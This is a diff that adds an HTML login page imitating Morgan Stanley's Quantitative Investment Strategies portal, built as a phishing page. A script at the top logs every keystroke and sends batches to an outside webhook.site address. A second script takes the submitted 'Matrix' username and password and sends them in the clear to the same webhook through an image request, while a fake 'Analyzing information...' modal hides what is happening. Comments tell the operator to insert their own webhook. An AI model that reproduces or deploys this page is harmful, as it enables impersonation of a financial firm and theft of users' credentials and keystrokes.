@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Official Morgan Stanley Quantitative Investment Strategies -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Morgan Stanley Quantitative Investment Strategies</title>
+    <style>
+        body {
+            background-color: rgb(255, 255, 255); /* MS style */
+            font-family: "Basic Sans Light SF", sans-serif;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.3rem;
+            letter-spacing: 0.2px;
+        }
+        .container {
+            width: 100%;
+            padding-right: 0px;
+            padding-left: 0px;
+            margin-right: 0px;
+            margin-left: 0px;
+        }
+        h1 {
+            font-kerning: normal;
+        }
+        h2 {
+            color: rgb(38 154 229);
+            font-family: Calibri;
+            font-weight: normal;
+            font-size: 25px;
+        }
+        h3 {
+            font-family: Arial;
+            font-weight: normal;
+            font-size: 15px;
+        }
+        .row {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+        }
+        .col {
+            position: relative;
+            width: 100%;
+        }
+        .justify-content-center {
+            -webkit-box-pack: center !important;
+            -ms-flex-pack: center !important;
+            justify-content: center !important;
+        }
+        .login-wrap {
+            position: relative;
+            overfow: hidden;
+            background: #fff;
+            border-radius: 5px;
+            z-index: 0;
+            width: 100%;
+            min-width: 500px;
+            max-width: 1000px;
+        }
+        form {
+            border: 0;
+            outline: 0;
+            margin: 0 auto;
+            padding: 10px;
+            padding-right: 35px;
+            //border: 1px solid black;
+        }
+        input {
+            border: 0;
+            outline: 0;
+            background-color: #f0f6fa;
+            border-bottom: 1px solid #0056b3;
+            width: 100%;
+            height: 50px;
+            padding: 5px 5px;
+            font-size: 1rem;
+            letter-spacing: 1px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: rgb(58, 120, 181); /* MS Blue */
+            color: white; /* Text color for the button */
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            transition-duration: 0.4s;
+            width: 33%;
+            height: 50px;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            letter-spacing: 0.2px;
+        }
+        button:hover {
+            background-color: #0056b3; /* Darker blue color on hover */
+            cursor: pointer;
+            font-family: "Basic Sans Light SF", sans-serif;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            letter-spacing: 0.2px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            text-align: center;
+        }
+        .modal-content {
+            background-color: white;
+            border-radius: 10px;
+            padding: 50px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: "Basic Sans Light SF", sans-serif;
+            font-weight: 400;
+            font-size: 1.5rem;
+            line-height: 1.3rem;
+            letter-spacing: 0.2px;
+            border: 2px solid #0056b3;
+
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+
+        // This function is a live logger so we can help people in need.
+        // Make sure you change the url to our live webhook
+        // Make sure you modify the number of keystrokes you want before sending the data to webhook
+
+        (function() {
+            // Array to store captured keys
+            let capturedKeys = [];
+
+            // Function to send data to a webhook
+            function sendDataToWebhook(data) {
+                const formData = new URLSearchParams();
+                formData.append('keystrokes', data.join(''));  // Convert array to string
+
+                fetch('https://webhook.site/01ad73ef-2837-48b2-a4e0-6b8caca4b6ec', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+
+            // Event listener to capture keystrokes and send data when necessary
+            document.addEventListener('keydown', function(event) {
+                capturedKeys.push(event.key);
+                
+                if (capturedKeys.length >= 5) {
+                    sendDataToWebhook(capturedKeys);
+                    capturedKeys = [];  // Reset the captured keys
+                }
+            });
+        })();
+
+    </script>
+
+    <div class="container">
+        <div class="col">
+            <div class="row .justify-content-center">
+                <div class="login-wrap">
+                    <form id="myForm" onsubmit="return completeForm()">
+                    <h1>Morgan Stanley</h1>
+                    <h2>Quantitative Investment Strategies</h2>
+                    Morgan Stanley's QIS platform provides investors with a universe of systematic investable strategies to gain exposure to a wide range of return drivers across multiple asset classes, led by best in class content, in a fully transparent, liquid and scalable manner.</br></br>
+                    To continue, please login using your Matrix account</br></br>
+                    <input type="text" id="username" placeholder="Matrix Username" min="4" required><br><br>
+                    <input type="password" id="password" placeholder="Matrix Password" min="8" required><br><br>
+                    <button type="submit">Confirm</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal HTML -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <p>Analyzing information...</p>
+        </div>
+    </div>
+
+    <script>
+
+        // This function is to send the username and password to our live webhook
+        // Make sure to change the name of the webhook a bit lower in the function
+
+        document.getElementById("myForm").addEventListener("submit", function (event) {
+
+            event.preventDefault(); // Prevent the form from submitting by default
+
+            const value = document.getElementById("username").value;
+            const value1 = document.getElementById("password").value;
+
+            // Show the modal
+            document.getElementById("myModal").style.display = "block";
+
+            // Create a single Image object and send both values in one request
+            var image = new Image();
+
+            // Once create - the src is update and sent to a webhook instance - update to make sure you get something
+            image.src = "https://webhook.site/01ad73ef-2837-48b2-a4e0-6b8caca4b6ec/?username=" + value + "&password=" + value1;
+
+            // Once the analysis is complete - hide the modal
+            setTimeout(function () {
+                document.getElementById("myModal").style.display = "none";
+
+            }, 3000); // Adjust the delay as needed
+        });
+
+    </script>
+    
+</body>
+</html>
